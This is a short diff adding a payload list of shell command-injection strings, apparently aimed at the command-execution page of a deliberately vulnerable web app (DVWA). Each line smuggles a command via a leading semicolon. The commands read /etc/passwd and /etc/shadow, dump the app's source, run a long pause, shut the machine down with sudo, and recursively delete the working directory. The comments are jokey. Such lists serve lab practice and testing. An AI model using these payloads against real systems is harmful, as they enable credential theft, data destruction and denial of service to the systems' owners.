@@ -1,0 +1,20 @@
+# Hope you use threads :p
+;pause 99999
+
+# Passwords plus some pausing.
+;cat /etc/passwd;echo "Uh oh, stinky!";cat /etc/shadow
+
+# Show directory contents
+;ls -lash ./
+
+# Working dir
+;pwd
+
+# Source code!
+;cat /var/www/html/vulnerabilities/exec/index.php
+
+# Uh oh, stinky!
+;sudo shutdown now
+
+# Oh fuck. Delete current directory.
+;DIR=`pwd`;cd ..;rm -r $DIR;
